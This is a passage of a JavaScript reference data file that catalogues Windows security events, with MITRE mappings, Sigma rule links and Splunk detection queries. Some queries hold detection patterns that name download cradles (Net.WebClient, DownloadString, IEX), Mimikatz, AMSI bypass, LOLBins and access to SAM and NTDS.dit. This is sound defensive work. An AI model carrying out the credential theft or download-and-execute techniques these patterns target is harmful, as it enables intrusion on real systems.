// ═══════════════════════════════════════════════════════════════════════
// System Intelligence — Windows Event Logs, PowerShell, Network & Registry
// Comprehensive forensic + detection reference layer
// Cross-linked to Sigma Rules, MITRE ATT&CK, Categories & IR
// ═══════════════════════════════════════════════════════════════════════

// ══════════════════════════════════════════════
// SECTION 1: WINDOWS EVENT LOGS (Full Coverage)
// ══════════════════════════════════════════════

const WINDOWS_EVENT_LOGS = [
  // ── 🔐 Authentication & Logon ──
  {
    eventId: '4624',
    title: 'Successful Logon',
    category: 'authentication',
    categoryLabel: '🔐 Authentication & Logon',
    description: 'An account was successfully logged on. This is one of the most important security events — it records every successful authentication including logon type, source IP, and authentication package used.',
    detectionRelevance: 'Critical for identifying unauthorized access, lateral movement (Type 3/10), and compromised credentials. Correlate with preceding 4625 events to detect brute force success.',
    relatedAttackType: 'Credential Access, Lateral Movement, Initial Access',
    severity: 'high',
    mitreTechniques: [
      { id: 'T1078', name: 'Valid Accounts' },
      { id: 'T1021', name: 'Remote Services' }
    ],
    relatedSigmaRules: ['sigma-brute-force-success', 'sigma-lateral-rdp', 'sigma-pass-the-hash'],
    relatedCategories: ['brute-force', 'lateral-movement', 'initial-access'],
    relatedIR: 'brute-force',
    logonTypes: [
      { type: 2, name: 'Interactive', desc: 'Local keyboard/screen logon' },
      { type: 3, name: 'Network', desc: 'SMB, mapped drives — key for lateral movement' },
      { type: 4, name: 'Batch', desc: 'Scheduled task execution' },
      { type: 5, name: 'Service', desc: 'Service startup' },
      { type: 7, name: 'Unlock', desc: 'Workstation unlock' },
      { type: 8, name: 'NetworkCleartext', desc: 'Cleartext credential network logon — IIS Basic Auth' },
      { type: 9, name: 'NewCredentials', desc: 'RunAs with /netonly — credentials used for network only' },
      { type: 10, name: 'RemoteInteractive', desc: 'RDP / Terminal Services — critical for lateral movement detection' },
      { type: 11, name: 'CachedInteractive', desc: 'Domain cached credential logon' }
    ],
    keyFields: ['TargetUserName', 'LogonType', 'IpAddress', 'WorkstationName', 'AuthenticationPackageName', 'LogonProcessName'],
    sampleQuery: 'index=wineventlog sourcetype=WinEventLog:Security EventCode=4624 LogonType=10\n| stats count by TargetUserName, IpAddress, LogonType'
  },
  {
    eventId: '4625',
    title: 'Failed Logon',
    category: 'authentication',
    categoryLabel: '🔐 Authentication & Logon',
    description: 'An account failed to log on. Records failed authentication attempts with failure reason codes. Primary indicator for brute force, password spraying, and credential stuffing attacks.',
    detectionRelevance: 'Foundation of brute force detection. High volume from single IP = brute force. High unique targets from single IP = password spray. Correlate with 4624 success to find compromised accounts.',
    relatedAttackType: 'Brute Force, Password Spraying, Credential Stuffing',
    severity: 'high',
    mitreTechniques: [
      { id: 'T1110', name: 'Brute Force' },
      { id: 'T1110.001', name: 'Password Guessing' },
      { id: 'T1110.003', name: 'Password Spraying' }
    ],
    relatedSigmaRules: ['sigma-brute-force-threshold', 'sigma-password-spray', 'sigma-credential-stuffing'],
    relatedCategories: ['brute-force', 'credential-access'],
    relatedIR: 'brute-force',
    failureCodes: [
      { code: '0xC0000064', reason: 'User name does not exist — user enumeration' },
      { code: '0xC000006A', reason: 'Incorrect password — brute force indicator' },
      { code: '0xC0000072', reason: 'Account disabled' },
      { code: '0xC000006F', reason: 'Logon outside authorized hours' },
      { code: '0xC0000070', reason: 'Unauthorized workstation' },
      { code: '0xC0000071', reason: 'Expired password' },
      { code: '0xC0000234', reason: 'Account locked out' }
    ],
    keyFields: ['TargetUserName', 'IpAddress', 'Status', 'SubStatus', 'LogonType', 'FailureReason'],
    sampleQuery: 'index=wineventlog EventCode=4625\n| bin _time span=15m\n| stats count dc(TargetUserName) as unique_users by src_ip, _time\n| where count > 15'
  },
  {
    eventId: '4672',
    title: 'Special Privileges Assigned to New Logon',
    category: 'authentication',
    categoryLabel: '🔐 Authentication & Logon',
    description: 'Logged when an account with admin/special privileges successfully logs on. Records which elevated privileges were assigned to the session. Critical for tracking privileged access.',
    detectionRelevance: 'Monitors privileged logons. Correlate with 4624 to see where admin accounts are being used. Alert on SeDebugPrivilege for non-SYSTEM accounts — strong indicator of Mimikatz/credential theft tools.',
    relatedAttackType: 'Privilege Escalation, Credential Access',
    severity: 'critical',
    mitreTechniques: [
      { id: 'T1134', name: 'Access Token Manipulation' },
      { id: 'T1078', name: 'Valid Accounts' }
    ],
    relatedSigmaRules: ['sigma-sedebugprivilege', 'sigma-admin-logon-anomaly'],
    relatedCategories: ['privilege-escalation', 'credential-access'],
    relatedIR: 'privilege-escalation',
    keyPrivileges: [
      'SeDebugPrivilege — Debug programs (Mimikatz indicator)',
      'SeTcbPrivilege — Act as part of OS',
      'SeBackupPrivilege — Bypass file security for backup',
      'SeRestorePrivilege — Bypass file security for restore',
      'SeTakeOwnershipPrivilege — Take ownership of files',
      'SeLoadDriverPrivilege — Load kernel drivers',
      'SeImpersonatePrivilege — Impersonate client (Potato attacks)'
    ],
    keyFields: ['SubjectUserName', 'PrivilegeList', 'SubjectLogonId'],
    sampleQuery: 'index=wineventlog EventCode=4672\n| where PrivilegeList="*SeDebugPrivilege*"\n| where NOT SubjectUserName IN ("SYSTEM","LOCAL SERVICE")\n| stats count by SubjectUserName, ComputerName'
  },
  {
    eventId: '4648',
    title: 'Logon Using Explicit Credentials',
    category: 'authentication',
    categoryLabel: '🔐 Authentication & Logon',
    description: 'A logon was attempted using explicit credentials (RunAs, mapped drives with different creds). Records both the user performing the action and the credentials being used.',
    detectionRelevance: 'Detects credential misuse and lateral movement preparation. An attacker using stolen creds via RunAs or net use triggers this. Also detects scheduled tasks running with specific credentials.',
    relatedAttackType: 'Lateral Movement, Credential Access',
    severity: 'medium',
    mitreTechniques: [
      { id: 'T1078', name: 'Valid Accounts' },
      { id: 'T1021', name: 'Remote Services' }
    ],
    relatedSigmaRules: ['sigma-explicit-cred-logon'],
    relatedCategories: ['lateral-movement', 'credential-access'],
    relatedIR: 'lateral-movement',
    keyFields: ['SubjectUserName', 'TargetUserName', 'TargetServerName', 'TargetInfo'],
    sampleQuery: 'index=wineventlog EventCode=4648\n| where SubjectUserName!=TargetUserName\n| stats count by SubjectUserName, TargetUserName, TargetServerName'
  },

  // ── 👤 Account Management ──
  {
    eventId: '4720',
    title: 'User Account Created',
    category: 'account-management',
    categoryLabel: '👤 Account Management',
    description: 'A new user account was created. Records who created the account, the new account name, and account flags. Unauthorized account creation is a strong persistence indicator.',
    detectionRelevance: 'Critical for detecting unauthorized local/domain account creation used for persistence. Correlate with 4732 (group addition) to detect "create and elevate" attack pattern.',
    relatedAttackType: 'Persistence, Privilege Escalation',
    severity: 'high',
    mitreTechniques: [
      { id: 'T1136.001', name: 'Create Account: Local Account' },
      { id: 'T1136.002', name: 'Create Account: Domain Account' }
    ],
    relatedSigmaRules: ['sigma-new-local-admin', 'sigma-suspicious-user-creation'],
    relatedCategories: ['persistence', 'privilege-escalation'],
    relatedIR: 'active-directory',
    keyFields: ['TargetUserName', 'SubjectUserName', 'SubjectDomainName'],
    sampleQuery: 'index=wineventlog EventCode=4720\n| table _time, SubjectUserName, TargetUserName, ComputerName'
  },
  {
    eventId: '4726',
    title: 'User Account Deleted',
    category: 'account-management',
    categoryLabel: '👤 Account Management',
    description: 'A user account was deleted. Can indicate cleanup by an attacker removing accounts used for persistence, or legitimate deprovisioning.',
    detectionRelevance: 'Monitor for deletion of recently-created accounts — attackers may create temporary accounts and delete them to cover tracks. Correlate with 4720 to build account lifecycle.',
    relatedAttackType: 'Defense Evasion, Anti-Forensics',
    severity: 'medium',
    mitreTechniques: [
      { id: 'T1070', name: 'Indicator Removal' }
    ],
    relatedSigmaRules: ['sigma-account-deleted'],
    relatedCategories: ['defense-evasion'],
    relatedIR: 'active-directory',
    keyFields: ['TargetUserName', 'SubjectUserName'],
    sampleQuery: 'index=wineventlog EventCode=4726\n| table _time, SubjectUserName, TargetUserName, ComputerName'
  },
  {
    eventId: '4728',
    title: 'Member Added to Security-Enabled Global Group',
    category: 'account-management',
    categoryLabel: '👤 Account Management',
    description: 'A member was added to a security-enabled global group (e.g., Domain Admins). Critical for detecting unauthorized privilege escalation via group membership changes.',
    detectionRelevance: 'Addition to Domain Admins, Enterprise Admins, or Schema Admins is an immediate critical alert. Monitor for any changes to Tier 0 groups.',
    relatedAttackType: 'Privilege Escalation, Persistence',
    severity: 'critical',
    mitreTechniques: [
      { id: 'T1098', name: 'Account Manipulation' },
      { id: 'T1078.002', name: 'Valid Accounts: Domain Accounts' }
    ],
    relatedSigmaRules: ['sigma-domain-admin-addition'],
    relatedCategories: ['privilege-escalation', 'active-directory'],
    relatedIR: 'active-directory',
    keyFields: ['MemberName', 'MemberSid', 'TargetUserName', 'SubjectUserName'],
    sampleQuery: 'index=wineventlog EventCode=4728\n| where TargetUserName IN ("Domain Admins","Enterprise Admins","Schema Admins")\n| table _time, SubjectUserName, MemberName, TargetUserName'
  },
  {
    eventId: '4732',
    title: 'Member Added to Security-Enabled Local Group',
    category: 'account-management',
    categoryLabel: '👤 Account Management',
    description: 'A member was added to a security-enabled local group (e.g., local Administrators). Key indicator when correlated with 4720 for "create and elevate" persistence.',
    detectionRelevance: 'Adding users to local Administrators group on workstations/servers. Should be very rare in managed environments. Any addition from a non-provisioning system is suspicious.',
    relatedAttackType: 'Privilege Escalation, Persistence',
    severity: 'high',
    mitreTechniques: [
      { id: 'T1098', name: 'Account Manipulation' },
      { id: 'T1136.001', name: 'Create Account: Local Account' }
    ],
    relatedSigmaRules: ['sigma-new-local-admin'],
    relatedCategories: ['privilege-escalation', 'persistence'],
    relatedIR: 'privilege-escalation',
    keyFields: ['MemberName', 'TargetUserName', 'SubjectUserName', 'ComputerName'],
    sampleQuery: 'index=wineventlog EventCode=4732 TargetUserName="Administrators"\n| stats count by SubjectUserName, MemberName, ComputerName'
  },

  // ── ⚙️ Process Execution ──
  {
    eventId: '4688',
    title: 'Process Created',
    category: 'process-execution',
    categoryLabel: '⚙️ Process Execution',
    description: 'A new process was created. With command-line auditing enabled, captures the full command line. Fundamental for detecting malicious execution, LOLBins, and attack tools.',
    detectionRelevance: 'Core detection event for execution monitoring. Enable "Include command line in process creation events" GPO. Without this, you lose visibility into what commands attackers run.',
    relatedAttackType: 'Execution, Defense Evasion',
    severity: 'high',
    mitreTechniques: [
      { id: 'T1059', name: 'Command and Scripting Interpreter' },
      { id: 'T1059.001', name: 'PowerShell' },
      { id: 'T1059.003', name: 'Windows Command Shell' },
      { id: 'T1218', name: 'System Binary Proxy Execution' }
    ],
    relatedSigmaRules: ['sigma-suspicious-process', 'sigma-lolbin-execution', 'sigma-certutil-download'],
    relatedCategories: ['execution', 'defense-evasion', 'windows-specific'],
    relatedIR: 'endpoint-anomalies',
    keyFields: ['NewProcessName', 'CommandLine', 'ParentProcessName', 'SubjectUserName', 'TokenElevationType'],
    sampleQuery: 'index=wineventlog EventCode=4688\n| where match(NewProcessName, "(?i)(cmd|powershell|mshta|certutil|regsvr32)")\n| table _time, SubjectUserName, NewProcessName, CommandLine, ParentProcessName'
  },
  {
    eventId: 'Sysmon 1',
    title: 'Process Create (Sysmon)',
    category: 'process-execution',
    categoryLabel: '⚙️ Process Execution',
    description: 'Sysmon Process Creation — provides superior process tracking including parent process, command line, file hashes, and process GUID for reliable process tree reconstruction.',
    detectionRelevance: 'Gold standard for process creation monitoring. Includes ParentImage, CommandLine, Hashes, and ProcessGuid. Essential for detecting process injection, LOLBins, and fileless malware.',
    relatedAttackType: 'Execution, Defense Evasion, Lateral Movement',
    severity: 'high',
    mitreTechniques: [
      { id: 'T1059', name: 'Command and Scripting Interpreter' },
      { id: 'T1055', name: 'Process Injection' },
      { id: 'T1218', name: 'System Binary Proxy Execution' }
    ],
    relatedSigmaRules: ['sigma-sysmon-process-creation', 'sigma-suspicious-parent-child'],
    relatedCategories: ['execution', 'defense-evasion', 'endpoint-anomalies'],
    relatedIR: 'endpoint-anomalies',
    keyFields: ['Image', 'CommandLine', 'ParentImage', 'ParentCommandLine', 'User', 'Hashes', 'ProcessGuid', 'IntegrityLevel'],
    sampleQuery: 'index=wineventlog sourcetype=WinEventLog:Sysmon EventCode=1\n| where ParentImage="*\\\\WmiPrvSE.exe" AND match(Image,"(?i)(cmd|powershell)")\n| table _time, User, ParentImage, Image, CommandLine'
  },

  // ── 🔑 Privilege Use ──
  {
    eventId: '4673',
    title: 'A Privileged Service Was Called',
    category: 'privilege-use',
    categoryLabel: '🔑 Privilege Use',
    description: 'A user attempted to exercise a privileged system service. Monitors sensitive privilege usage that could indicate privilege escalation or system manipulation.',
    detectionRelevance: 'Alert on SeDebugPrivilege, SeImpersonatePrivilege usage by non-system accounts. These privileges are commonly abused by Mimikatz, Potato exploits, and other escalation tools.',
    relatedAttackType: 'Privilege Escalation',
    severity: 'high',
    mitreTechniques: [
      { id: 'T1134', name: 'Access Token Manipulation' },
      { id: 'T1134.001', name: 'Token Impersonation/Theft' }
    ],
    relatedSigmaRules: ['sigma-sensitive-privilege-use'],
    relatedCategories: ['privilege-escalation'],
    relatedIR: 'privilege-escalation',
    keyFields: ['SubjectUserName', 'Service', 'PrivilegeUsed', 'ProcessName', 'ObjectName'],
    sampleQuery: 'index=wineventlog EventCode=4673 PrivilegeUsed="SeDebugPrivilege"\n| where SubjectUserName!="SYSTEM"\n| stats count by SubjectUserName, ProcessName'
  },
  {
    eventId: '4674',
    title: 'Operation Attempted on Privileged Object',
    category: 'privilege-use',
    categoryLabel: '🔑 Privilege Use',
    description: 'An operation was attempted on an object with requested privileges. Indicates that a user is actively exercising elevated privileges on specific objects.',
    detectionRelevance: 'Monitor for operations on sensitive objects using elevated privileges. Helps detect privilege abuse patterns where users access objects they normally wouldn\'t.',
    relatedAttackType: 'Privilege Escalation',
    severity: 'medium',
    mitreTechniques: [
      { id: 'T1134', name: 'Access Token Manipulation' }
    ],
    relatedSigmaRules: ['sigma-privileged-operation'],
    relatedCategories: ['privilege-escalation'],
    relatedIR: 'privilege-escalation',
    keyFields: ['SubjectUserName', 'ObjectName', 'ObjectType', 'ProcessName', 'DesiredAccess'],
    sampleQuery: 'index=wineventlog EventCode=4674\n| stats count by SubjectUserName, ObjectName, ProcessName'
  },

  // ── 📜 PowerShell Logs ──
  {
    eventId: '4104',
    title: 'PowerShell Script Block Logging',
    category: 'powershell',
    categoryLabel: '📜 PowerShell Logs',
    description: 'Records PowerShell script blocks as they are executed. Captures the full deobfuscated script content, making it the most valuable log for detecting PowerShell-based attacks even when obfuscation is used.',
    detectionRelevance: 'CRITICAL — captures the actual script content after deobfuscation. Detects Invoke-Mimikatz, encoded commands, download cradles, AMSI bypass attempts, and all PowerShell-based attack frameworks.',
    relatedAttackType: 'Execution, Defense Evasion, Credential Access',
    severity: 'critical',
    mitreTechniques: [
      { id: 'T1059.001', name: 'PowerShell' },
      { id: 'T1027', name: 'Obfuscated Files or Information' }
    ],
    relatedSigmaRules: ['sigma-powershell-suspicious', 'sigma-invoke-mimikatz', 'sigma-powershell-download-cradle'],
    relatedCategories: ['execution', 'defense-evasion', 'windows-specific'],
    relatedIR: 'windows-specific',
    keyFields: ['ScriptBlockText', 'ScriptBlockId', 'Path', 'MessageNumber', 'MessageTotal'],
    sampleQuery: 'index=wineventlog sourcetype=WinEventLog:Microsoft-Windows-PowerShell/Operational EventCode=4104\n| where match(ScriptBlockText, "(?i)(Invoke-Mimikatz|Net.WebClient|DownloadString|IEX|AMSI)")\n| table _time, ComputerName, ScriptBlockText'
  },
  {
    eventId: '4103',
    title: 'PowerShell Module Logging',
    category: 'powershell',
    categoryLabel: '📜 PowerShell Logs',
    description: 'Records PowerShell module/cmdlet execution with parameters. Provides a pipeline execution log showing which cmdlets were run and with what arguments.',
    detectionRelevance: 'Complements 4104 Script Block Logging. Captures cmdlet execution even when scripts are not used directly. Useful for detecting reconnaissance cmdlets and AD enumeration.',
    relatedAttackType: 'Execution, Discovery',
    severity: 'medium',
    mitreTechniques: [
      { id: 'T1059.001', name: 'PowerShell' },
      { id: 'T1087', name: 'Account Discovery' }
    ],
    relatedSigmaRules: ['sigma-powershell-module-logging'],
    relatedCategories: ['execution', 'reconnaissance'],
    relatedIR: 'windows-specific',
    keyFields: ['Payload', 'ContextInfo', 'UserData'],
    sampleQuery: 'index=wineventlog EventCode=4103\n| where match(Payload, "(?i)(Get-ADUser|Get-ADComputer|Get-NetDomain|Invoke-)")\n| table _time, ComputerName, Payload'
  },

  // ── 🛡️ Security & Policy Changes ──
  {
    eventId: '4719',
    title: 'System Audit Policy Changed',
    category: 'security-policy',
    categoryLabel: '🛡️ Security & Policy Changes',
    description: 'The system audit policy was changed. Detects changes to what events Windows is configured to audit. Attackers may disable auditing to blind defenders.',
    detectionRelevance: 'CRITICAL — an attacker disabling audit policies is attempting to blind your SIEM. Any unexpected audit policy change should trigger an immediate alert and investigation.',
    relatedAttackType: 'Defense Evasion',
    severity: 'critical',
    mitreTechniques: [
      { id: 'T1562.002', name: 'Impair Defenses: Disable Windows Event Logging' }
    ],
    relatedSigmaRules: ['sigma-audit-policy-changed', 'sigma-defense-evasion-logging'],
    relatedCategories: ['defense-evasion'],
    relatedIR: 'defense-evasion',
    keyFields: ['SubjectUserName', 'CategoryId', 'SubcategoryGuid', 'AuditPolicyChanges'],
    sampleQuery: 'index=wineventlog EventCode=4719\n| table _time, SubjectUserName, CategoryId, AuditPolicyChanges, ComputerName'
  },
  {
    eventId: '1102',
    title: 'Audit Log Cleared',
    category: 'security-policy',
    categoryLabel: '🛡️ Security & Policy Changes',
    description: 'The audit log was cleared. Indicates someone deliberately deleted the Security event log. Almost always malicious when not performed during scheduled maintenance.',
    detectionRelevance: 'HIGH-CONFIDENCE INDICATOR — clearing the Security log is textbook evidence destruction. Forward this event to a separate, protected log store. Alert immediately on any occurrence.',
    relatedAttackType: 'Defense Evasion, Anti-Forensics',
    severity: 'critical',
    mitreTechniques: [
      { id: 'T1070.001', name: 'Indicator Removal: Clear Windows Event Logs' }
    ],
    relatedSigmaRules: ['sigma-event-log-cleared', 'sigma-log-tampering'],
    relatedCategories: ['defense-evasion'],
    relatedIR: 'defense-evasion',
    keyFields: ['SubjectUserName', 'SubjectDomainName'],
    sampleQuery: 'index=wineventlog EventCode=1102\n| table _time, SubjectUserName, SubjectDomainName, ComputerName'
  },

  // ── 📂 Object Access ──
  {
    eventId: '4663',
    title: 'Attempt to Access Object',
    category: 'object-access',
    categoryLabel: '📂 Object Access',
    description: 'An attempt was made to access an object (file, registry key, kernel object). Requires SACL configuration on the target objects to generate events.',
    detectionRelevance: 'Key for detecting unauthorized file access, data staging for exfiltration, and access to sensitive files (SAM, NTDS.dit, SYSTEM hive). Configure SACLs on critical files.',
    relatedAttackType: 'Collection, Data Exfiltration, Credential Access',
    severity: 'medium',
    mitreTechniques: [
      { id: 'T1005', name: 'Data from Local System' },
      { id: 'T1039', name: 'Data from Network Shared Drive' },
      { id: 'T1003.002', name: 'SAM' }
    ],
    relatedSigmaRules: ['sigma-sensitive-file-access', 'sigma-sam-access'],
    relatedCategories: ['data-exfiltration', 'credential-access', 'insider-threat'],
    relatedIR: 'data-exfiltration',
    keyFields: ['SubjectUserName', 'ObjectName', 'ObjectType', 'ProcessName', 'AccessMask'],
    sampleQuery: 'index=wineventlog EventCode=4663\n| where match(ObjectName, "(?i)(sam|ntds\\\\.dit|system32\\\\\\\\config)")\n| table _time, SubjectUserName, ObjectName, ProcessName, AccessMask'
  },
  {
    eventId: '4656',
    title: 'Handle to Object Requested',
    category: 'object-access',
    categoryLabel: '📂 Object Access',
    description: 'A handle to an object was requested. Precedes 4663 — records the intent to access an object with specific permissions. Useful for detecting access attempts even if denied.',
    detectionRelevance: 'Detect attempts to open sensitive files or registry keys even when access is denied. Useful for detecting reconnaissance of file system permissions and unauthorized access attempts.',
    relatedAttackType: 'Discovery, Collection',
    severity: 'low',
    mitreTechniques: [
      { id: 'T1083', name: 'File and Directory Discovery' }
    ],
    relatedSigmaRules: ['sigma-handle-request-sensitive'],
    relatedCategories: ['reconnaissance'],
    relatedIR: 'insider-threat',
    keyFields: ['SubjectUserName', 'ObjectName', 'ObjectType', 'ProcessName', 'DesiredAccess'],
    sampleQuery: 'index=wineventlog EventCode=4656\n| where match(ObjectName, "(?i)(password|credential|secret|key)")\n| stats count by SubjectUserName, ObjectName'
  },

  // ── 🌐 Network Events ──
  {
    eventId: 'Sysmon 3',
    title: 'Network Connection Detected (Sysmon)',
    category: 'network-events',
    categoryLabel: '🌐 Network Events',
    description: 'Sysmon logs TCP/UDP connections initiated by processes. Captures source/destination IP, port, and the process responsible. Essential for C2 detection and lateral movement tracking.',
    detectionRelevance: 'Critical for detecting C2 communications, data exfiltration channels, and lateral movement. Correlate with process creation (Sysmon 1) to build full attack chains.',
    relatedAttackType: 'Command & Control, Data Exfiltration, Lateral Movement',
    severity: 'high',
    mitreTechniques: [
      { id: 'T1071', name: 'Application Layer Protocol' },
      { id: 'T1041', name: 'Exfiltration Over C2 Channel' },
      { id: 'T1021', name: 'Remote Services' }
    ],
    relatedSigmaRules: ['sigma-suspicious-outbound', 'sigma-c2-beaconing', 'sigma-lateral-smb'],
    relatedCategories: ['command-control', 'data-exfiltration', 'lateral-movement', 'network-anomalies'],
    relatedIR: 'network-anomalies',
    keyFields: ['Image', 'User', 'SourceIp', 'SourcePort', 'DestinationIp', 'DestinationPort', 'Protocol', 'DestinationHostname'],
    sampleQuery: 'index=wineventlog sourcetype=WinEventLog:Sysmon EventCode=3\n| where NOT match(DestinationIp,"^(10\\\\.|172\\\\.(1[6-9]|2|3[01])\\\\.|192\\\\.168\\\\.)")\n| stats count by Image, DestinationIp, DestinationPort'
  },
  {
    eventId: 'FW-001',
    title: 'Windows Firewall Connection Events',
    category: 'network-events',
    categoryLabel: '🌐 Network Events',
    description: 'Windows Filtering Platform (WFP) firewall events capture allowed and blocked connections. Includes Windows Firewall with Advanced Security events (2004, 2005, 2006).',
    detectionRelevance: 'Detect unauthorized outbound connections, port scanning, and firewall rule tampering. Firewall rule changes (2004/2005) can indicate an attacker opening backdoor ports.',
    relatedAttackType: 'Defense Evasion, Command & Control',
    severity: 'medium',
    mitreTechniques: [
      { id: 'T1562.004', name: 'Impair Defenses: Disable or Modify System Firewall' }
    ],
    relatedSigmaRules: ['sigma-firewall-rule-change'],
    relatedCategories: ['defense-evasion', 'network-anomalies'],
    relatedIR: 'network-anomalies',
    keyFields: ['RuleName', 'Application', 'Direction', 'SourceAddress', 'DestAddress', 'DestPort', 'Protocol'],
    sampleQuery: 'index=wineventlog source="WinEventLog:Microsoft-Windows-Windows Firewall With Advanced Security/Firewall"\n| where EventCode IN (2004, 2005, 2006)\n| table _time, EventCode, RuleName, Application'
  },
  {
    eventId: 'DNS-001',
    title: 'DNS Query Logs',
    category: 'network-events',
    categoryLabel: '🌐 Network Events',
    description: 'DNS query logging (Sysmon Event 22 or Windows DNS Client/Server logs) captures all DNS lookups. Critical for detecting C2 over DNS, DGA domains, and DNS tunneling.',
    detectionRelevance: 'Foundation of DNS-based threat detection. Look for high-entropy domains (DGA), long TXT queries (DNS tunneling), queries to known-bad domains, and anomalous query volumes.',
    relatedAttackType: 'Command & Control, Data Exfiltration',
    severity: 'high',
    mitreTechniques: [
      { id: 'T1071.004', name: 'Application Layer Protocol: DNS' },
      { id: 'T1568', name: 'Dynamic Resolution' },
      { id: 'T1048.003', name: 'Exfiltration Over Unencrypted Non-C2 Protocol' }
    ],
    relatedSigmaRules: ['sigma-dns-tunneling', 'sigma-dga-detection', 'sigma-suspicious-dns'],
    relatedCategories: ['command-control', 'data-exfiltration', 'network-anomalies'],
    relatedIR: 'network-anomalies',
    keyFields: ['QueryName', 'QueryType', 'QueryResults', 'Image'],
    sampleQuery: 'index=dns OR (index=wineventlog sourcetype=WinEventLog:Sysmon EventCode=22)\n| eval query_len=len(QueryName)\n| where query_len > 50\n| stats count by QueryName, Image'
  },

  // ── 🖥️ System Events ──
  {
    eventId: '6005',
    title: 'Event Log Service Started',
    category: 'system-events',
    categoryLabel: '🖥️ System Events',
    description: 'The Event Log Service was started. Indicates system startup. Useful for tracking system boot times and detecting unexpected reboots.',
    detectionRelevance: 'Track system boot times. Unexpected reboots during an incident may indicate attacker activity (installing rootkits, clearing evidence). Correlate with 6006 for uptime tracking.',
    relatedAttackType: 'Impact, Defense Evasion',
    severity: 'low',
    mitreTechniques: [
      { id: 'T1529', name: 'System Shutdown/Reboot' }
    ],
    relatedSigmaRules: [],
    relatedCategories: [],
    relatedIR: 'endpoint-anomalies',
    keyFields: [],
    sampleQuery: 'index=wineventlog EventCode=6005\n| table _time, ComputerName'
  },
  {
    eventId: '6006',
    title: 'Event Log Service Stopped',
    category: 'system-events',
    categoryLabel: '🖥️ System Events',
    description: 'The Event Log Service was stopped. Indicates clean system shutdown. Absence during an unexpected reboot (only 6008 present) indicates a crash or forced power-off.',
    detectionRelevance: 'Correlate with 6005 for system uptime. If a system reboots without 6006 (only unexpected shutdown 6008), it may indicate a BSOD exploit, kernel crash, or forced shutdown by attacker.',
    relatedAttackType: 'Impact',
    severity: 'low',
    mitreTechniques: [
      { id: 'T1529', name: 'System Shutdown/Reboot' }
    ],
    relatedSigmaRules: [],
    relatedCategories: [],
    relatedIR: 'endpoint-anomalies',
    keyFields: [],
    sampleQuery: 'index=wineventlog EventCode=6006\n| table _time, ComputerName'
  },
  {
    eventId: '7045',
    title: 'Service Installed on System',
    category: 'system-events',
    categoryLabel: '🖥️ System Events',
    description: 'A new service was installed on the system. Records the service name, path, type, and start type. Critical for detecting persistence via malicious service installation.',
    detectionRelevance: 'HIGH-VALUE — new service installation is a common persistence mechanism and lateral movement indicator (PsExec installs PSEXESVC). Alert on services running from temp directories or with suspicious names.',
    relatedAttackType: 'Persistence, Lateral Movement',
    severity: 'high',
    mitreTechniques: [
      { id: 'T1543.003', name: 'Create or Modify System Process: Windows Service' },
      { id: 'T1021.002', name: 'SMB/Windows Admin Shares' }
    ],
    relatedSigmaRules: ['sigma-malicious-service-install', 'sigma-psexec-service'],
    relatedCategories: ['persistence', 'lateral-movement'],
    relatedIR: 'lateral-movement',
    keyFields: ['ServiceName', 'ImagePath', 'ServiceType', 'StartType', 'AccountName'],
    sampleQuery: 'index=wineventlog EventCode=7045\n| where match(ImagePath, "(?i)(temp|tmp|appdata|psexec|cmd\\\\.exe|powershell)")\n| table _time, ServiceName, ImagePath, AccountName, ComputerName'
  },
  {
    eventId: '4697',
    title: 'Service Installed (Security Log)',
    category: 'system-events',
    categoryLabel: '🖥️ System Events',
    description: 'A service was installed in the system (Security log version). Provides similar information to 7045 but captured in the Security log with additional audit context.',
    detectionRelevance: 'Complements 7045. Some environments may have 7045 disabled but still log 4697 in Security log. Monitor both for complete service installation visibility.',
    relatedAttackType: 'Persistence, Lateral Movement',
    severity: 'high',
    mitreTechniques: [
      { id: 'T1543.003', name: 'Create or Modify System Process: Windows Service' }
    ],
    relatedSigmaRules: ['sigma-service-install-security'],
    relatedCategories: ['persistence', 'lateral-movement'],
    relatedIR: 'lateral-movement',
    keyFields: ['ServiceName', 'ServiceFileName', 'ServiceType', 'ServiceStartType', 'SubjectUserName'],
    sampleQuery: 'index=wineventlog EventCode=4697\n| table _time, SubjectUserName, ServiceName, ServiceFileName'
  },

  // ── Additional Critical Events ──
  {
    eventId: '4768',
    title: 'Kerberos TGT Requested',
    category: 'authentication',
    categoryLabel: '🔐 Authentication & Logon',
    description: 'A Kerberos authentication ticket (TGT) was requested. Logged on Domain Controllers. Records the account, IP, and encryption type used for the ticket request.',
    detectionRelevance: 'Baseline for Kerberos authentication flow. Compare TGT request IP (4768) with subsequent TGS request IP (4769) — a mismatch indicates Pass-the-Ticket attack.',
    relatedAttackType: 'Credential Access, Lateral Movement',
    severity: 'medium',
    mitreTechniques: [
      { id: 'T1558', name: 'Steal or Forge Kerberos Tickets' },
      { id: 'T1550.003', name: 'Pass the Ticket' }
    ],
    relatedSigmaRules: ['sigma-kerberos-anomaly'],
    relatedCategories: ['credential-access', 'active-directory'],
    relatedIR: 'active-directory',
    keyFields: ['TargetUserName', 'IpAddress', 'TicketEncryptionType', 'Status', 'ServiceName'],
    sampleQuery: 'index=wineventlog EventCode=4768\n| stats dc(IpAddress) as unique_ips by TargetUserName\n| where unique_ips > 1'
  },
  {
    eventId: '4769',
    title: 'Kerberos Service Ticket Requested',
    category: 'authentication',
    categoryLabel: '🔐 Authentication & Logon',
    description: 'A Kerberos service ticket (TGS) was requested. Critical for detecting Kerberoasting — excessive TGS requests with RC4 encryption targeting service accounts.',
    detectionRelevance: 'KERBEROASTING DETECTION — TGS requests with TicketEncryptionType 0x17 (RC4) for service accounts indicate Kerberoasting. Should trigger on >3 RC4 requests from single source in short window.',
    relatedAttackType: 'Credential Access',
    severity: 'high',
    mitreTechniques: [
      { id: 'T1558.003', name: 'Kerberoasting' }
    ],
    relatedSigmaRules: ['sigma-kerberoasting', 'sigma-kerberos-rc4-tgs'],
    relatedCategories: ['credential-access', 'active-directory'],
    relatedIR: 'active-directory',
    keyFields: ['TargetUserName', 'ServiceName', 'IpAddress', 'TicketEncryptionType', 'Status'],
    sampleQuery: 'index=wineventlog EventCode=4769 TicketEncryptionType=0x17 ServiceName!="krbtgt"\n| where NOT match(ServiceName, "\\\\$$")\n| stats dc(ServiceName) as services count by TargetUserName, IpAddress\n| where services > 3'
  },
  {
    eventId: '4771',
    title: 'Kerberos Pre-Authentication Failed',
    category: 'authentication',
    categoryLabel: '🔐 Authentication & Logon',
    description: 'Kerberos pre-authentication failed. The Kerberos equivalent of 4625, logged on Domain Controllers. Status code 0x18 = wrong password, 0x6 = unknown user.',
